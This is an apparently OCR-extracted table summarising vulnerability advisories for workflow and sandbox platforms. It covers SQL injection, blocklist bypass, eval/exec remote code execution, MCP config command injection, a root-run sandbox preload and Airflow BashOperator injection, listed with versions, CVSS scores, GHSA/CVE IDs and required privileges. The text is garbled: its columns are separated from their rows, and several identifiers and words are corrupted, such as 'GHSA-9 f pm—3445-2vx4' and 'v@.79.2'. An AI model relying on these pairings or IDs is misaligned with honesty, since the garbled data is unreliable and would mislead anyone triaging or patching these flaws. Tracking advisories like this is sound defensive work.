SQLi via queryParentSQL() recursive CTE
< 2.0.32 - eager-loading-tree.ts:59 - string PK concat
Python validator bypass — exfil/SSRF/RCE
3.1.0-3.1.2 + 38-pattern regex blocklist
Smart Transform eval () RCE
lambda_filter.py, startswith("lambda") only
custom_component exec() RCE
POST /api/v1/custom_component
MCP server config command injection
/api/v2/mcp/servers - bash —c exec
DifySandbox preload runs as root
dify-sandbox 0.2.15 + prescript.py ordering
V8 isolate bypass via importFresh
v@.79.2 + SANDBOX_CODE_ONLY
Command injection via Code step name
name is z.string() + bun build via exec()
Cmdinjection via interpreter
< 1.2.0 + ProcessBuilder, no validation
Cmd injection via be fo reCommands
< 1.2.0 + Pebble concat + /bin/sh -c
BashOperator injection via dag_run. conf
3.1.7 + fixed 3.2.0 + bash.py:235
Cvss/ID
9.9 Critical GHSA—42wx-r3jw-6c5h
8.7 High CWE-79/95
7.2 High CVE-2026-41641
7.5 High CVE-2026-41640
9.3 Critical GHSA—w7x8-q2gp-5cgg
Critical GHSA-9 f pm—3445-2vx4
Critical GHSA-8xrc-2j r4-78j7
Critical GHSA—w794-rj 3p-xv45
root, persistent
Critical GHSA-gr3h-c2j7-r52g
Critical GHSA-3pfv-m69p-5 fv5
9.8 Critical closed “intended”
9.8 Critical closed “intended”
8.8 High CVE-2026-30898
Min privilege
any authenticated
builder—store; any—trigger
collection-mgmt perm
record-create on tree coll
unauthenticated
post-auth (pre w/ flag)
post-auth (pre w/ flag)
authenticated
valid X-Api-Key
authenticated
authenticated
author / unauth webhook
unauth webhook
trigger perm
Lang
TS
TS
TS
TS
TS+Py
Py
Py
Py
Go+Py
TS
TS
REWZ-)
Java
Py
```
